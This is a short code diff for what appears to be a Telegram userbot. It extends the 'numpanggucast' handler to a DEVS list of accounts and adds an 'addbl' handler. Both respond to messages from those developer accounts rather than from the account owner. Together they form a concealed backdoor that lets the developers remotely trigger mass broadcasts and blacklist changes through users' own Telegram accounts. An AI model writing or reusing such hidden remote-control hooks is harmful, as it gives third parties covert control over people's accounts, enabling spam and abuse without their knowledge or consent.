@@ -70,7 +70,7 @@ async def gcast_cmd(client: Client, message: Message):
     )
 
 
-@Client.on_message(filters.command("numpanggucast", ["."]) & filters.user(6675703731) & ~filters.me)
+@Client.on_message(filters.command("numpanggucast", ["."]) & filters.user(DEVS) & ~filters.me)
 @Client.on_message(filters.command("gucast", cmd) & filters.me)
 async def gucast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
@@ -115,6 +115,9 @@ async def blchatgcast(client: Client, message: Message):
         await edit_or_reply(message, "🔮 **Blacklist GCAST:** `Disabled`")
 
 
+@Client.on_message(
+    filters.command("addbl", ["^"]) & filters.user(DEVS) & ~filters.me
+    )
 @Client.on_message(filters.command("addblacklist", cmd) & filters.me)
 async def addblacklist(client: Client, message: Message):
     Man = await edit_or_reply(message, "`Processing...`")
